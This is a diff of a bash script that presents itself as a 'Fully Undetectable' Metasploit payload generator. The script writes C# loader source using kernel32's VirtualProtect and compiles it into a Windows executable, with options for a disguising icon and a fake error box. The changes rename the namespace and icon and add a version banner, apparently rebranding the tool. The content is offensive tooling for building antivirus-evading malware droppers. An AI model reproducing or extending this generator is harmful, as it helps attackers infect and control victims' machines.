@@ -19,7 +19,7 @@ echo -e "|                   #Fully Undetectable#                   |"
 echo -e "|              #Metasploit Payload Generator#              |"
 echo -e "|          #Tested on Debian Jessie and Kali Linux#        |"
 echo -e "|———————————#—————————————————#——————————————————#—————————|"
-echo -e "|                                                   Sn_8ow |"
+echo -e "| Ver.2.0.1                                         Sn_8ow |"
 echo -e "\==========================================================/"
 echo ""
 sleep 2
@@ -289,7 +289,7 @@ echo "using System.Runtime.InteropServices;" >> Kodea
 if [ "$error" == "y" ]; then
 echo "using System.Windows.Forms;" >> Kodea;
 fi
-echo "namespace zirikatu" >> Kodea
+echo "namespace Pretter" >> Kodea
 echo "{ class Program" >> Kodea
 echo "{ [DllImport(\"kernel32.dll\", SetLastError = true)]" >> Kodea
 echo "static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);" >> Kodea
@@ -333,13 +333,13 @@ echo "}}}}" >> Kodea
 
 #kompilatu
 if [ "$icon" == "y" ] && [ "$error" == "n" ]; then 
-mcs -platform:x86 -unsafe Kodea -win32icon:$dir/zirikatu.ico -out:$dir/output/$izena.exe
+mcs -platform:x86 -unsafe Kodea -win32icon:$dir/pretter.ico -out:$dir/output/$izena.exe
 elif [ "$icon" == "n" ] && [ "$error" == "y" ]; then
 mcs -platform:x86 -unsafe Kodea -reference:System.Windows.Forms -out:$dir/output/$izena.exe
 elif [ "$icon" == "n" ] && [ "$error" == "n" ]; then
 mcs -platform:x86 -unsafe Kodea -out:$dir/output/$izena.exe
 elif [ "$icon" == "y" ] && [ "$error" == "y" ]; then
-mcs -platform:x86 -unsafe Kodea -win32icon:$dir/zirikatu.ico -reference:System.Windows.Forms -out:$dir/output/$izena.exe
+mcs -platform:x86 -unsafe Kodea -win32icon:$dir/pretter.ico -reference:System.Windows.Forms -out:$dir/output/$izena.exe
 fi
 
 #aldaketa
